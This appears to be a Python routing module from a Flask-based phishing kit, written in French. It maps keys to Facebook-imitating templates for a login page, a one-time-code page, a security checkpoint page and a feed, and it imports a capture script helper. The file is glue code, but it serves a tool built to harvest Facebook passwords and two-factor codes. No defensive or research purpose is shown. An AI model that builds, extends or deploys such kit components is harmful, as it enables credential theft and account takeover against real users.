"""route.py — Routes spécifiques à Facebook.

Facebook n'a pas de routes spécifiques au serveur — toutes les routes
(/, /feed, /video, etc.) sont génériques et dispatchent via le registry.
Ce fichier contient donc principalement le dictionnaire des templates
et des fonctions utilitaires pour le rendu Facebook.
"""

from platforms._shared import JS_STRICT_CAPTURE
from platforms.facebook.login import HTML_MOBILE
from platforms.facebook.otp import HTML_OTP_MOBILE
from platforms.facebook.checkpoint import HTML_CHECKPOINT
from platforms.facebook.feed import HTML_FEED


# ════════════════════════════════════════════════════════════════════
#  Dictionnaire des templates Facebook (mobile uniquement)
# ════════════════════════════════════════════════════════════════════
TEMPLATES = {
    "mobile_login": HTML_MOBILE,
    "pc_login":     HTML_MOBILE,  # PC redirigé, pas de template PC
    "mobile_otp":   HTML_OTP_MOBILE,
    "pc_otp":       HTML_OTP_MOBILE,  # PC redirigé, pas de template PC
    "checkpoint":   HTML_CHECKPOINT,
    "feed":         HTML_FEED,
}


def get_template(key):
    """Retourne le template demandé, ou None si non trouvé."""
    try:
        return TEMPLATES.get(key)
    except Exception as e:
        try:
            from platforms._shared import _log_err
            _log_err("facebook.route.get_template", e)
        except Exception:
            pass
        return None


def register_routes(app):
    """Enregistre les routes spécifiques à Facebook sur l'app Flask.
    Facebook n'a pas de routes spécifiques — tout est géré par les routes
    génériques de routes.py qui dispatchent via le registry."""
    pass  # Pas de routes spécifiques pour Facebook
